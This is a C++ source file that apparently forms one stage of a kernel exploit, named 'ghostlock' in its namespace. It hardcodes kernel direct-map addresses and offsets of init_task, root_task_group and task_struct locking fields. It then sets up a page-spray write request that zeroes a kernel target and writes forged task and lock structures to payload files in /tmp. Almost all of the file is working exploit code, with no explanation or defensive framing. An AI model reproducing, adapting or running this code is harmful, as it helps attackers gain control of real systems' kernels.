#include <cstdio>
#include <cstring>
#include <memory>
#include <vector>
#include "params.h"
#include "memory.h"
#include "support.h"
#include "payload_encode.h"
#include "target.h"

int main() {
    using namespace ghostlock;
    constexpr std::uintptr_t directMap = 0xffffff8000000000ULL;
    const auto alias = [](std::uintptr_t off) { return directMap | (0x28000000ULL + off); };
    constexpr std::uintptr_t base = 0xffffff8800210000ULL;
    /* debug-mondrian.conf: offset.mcast_fake_bss=41810296（合法示例 target） */
    const std::uintptr_t target = alias(41846440ULL);
    /* debug-mondrian.conf: offset.init_task=40542656 / root_task_group=41507584 */
    const std::uintptr_t initTask = alias(40542656ULL);
    const std::uintptr_t rootTaskGroup = alias(41507584ULL);

    std::unique_ptr<unsigned char[]> buf(new unsigned char[kernel::SKB_SEND_SIZE]);
    std::memset(buf.get(), 0x41, kernel::SKB_SEND_SIZE);
    memory::PayloadPage current;
    core::PageSprayInputs in{};
    in.current = &current;
    in.skb_buffer = &buf;
    in.request = memory::WriteRequest::make(target, memory::WriteMode::Zero, false);
    in.compact_waiter = 1;
    in.tcp_payload_layout = 0;
    in.init_task_alias = initTask;
    in.root_task_group_alias = rootTaskGroup;
    /* debug-mondrian.conf task_struct: prio=132 normal_prio=140 sched_task_group=784
       pi_lock=2156 pi_waiters=2176 pi_top_task=2192 pi_blocked_on=2200 */
    in.compact_task_prio_off = 132;
    in.compact_task_normal_prio_off = 140;
    in.compact_task_task_group_off = 784;
    in.compact_task_pi_lock_off = 2156;
    in.compact_task_pi_waiters_off = 2176;
    in.compact_task_pi_top_task_off = 2192;
    in.compact_task_pi_blocked_off = 2200;
    if (!support::prepare_skb_payload(in, base)) { std::printf("prepare failed\n"); return 1; }
    FILE *pf = std::fopen("/tmp/legacy2_payload.bin", "wb");
    if (!pf) return 2;
    std::fwrite(buf.get(), 1, kernel::SKB_SEND_SIZE, pf);
    std::fclose(pf);
    /* stamp via legacy2 pure encoder (route_multicast.cpp:76-91 layout). */
    std::vector<unsigned char> stamp(264, 0);
    if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte*>(stamp.data()), stamp.size()}, 96, 48, 56,
            current.fake_task, current.fake_lock)) { std::printf("stamp failed\n"); return 1; }
    FILE *sf = std::fopen("/tmp/legacy2_stamp.bin", "wb");
    if (!sf) return 2;
    std::fwrite(stamp.data(), 1, stamp.size(), sf);
    std::fclose(sf);
    std::printf("WROTE /tmp/legacy2_payload.bin %zu /tmp/legacy2_stamp.bin %zu\n",
        (size_t)kernel::SKB_SEND_SIZE, stamp.size());
    std::printf("BASE=%llx PAYLOAD_BASE=%llx FAKE_LOCK=%llx FAKE_W0=%llx FAKE_TASK=%llx\n",
        (unsigned long long)base, (unsigned long long)(current.fake_lock - kernel::LOCK_OFF),
        (unsigned long long)current.fake_lock, (unsigned long long)current.fake_w0,
        (unsigned long long)current.fake_task);
    std::printf("STAMP[144]=%llx STAMP[152]=%llx stamp_family=%u\n",
        (unsigned long long)current.fake_task, (unsigned long long)current.fake_lock,
        (unsigned)stamp[8]);
    return 0;
}
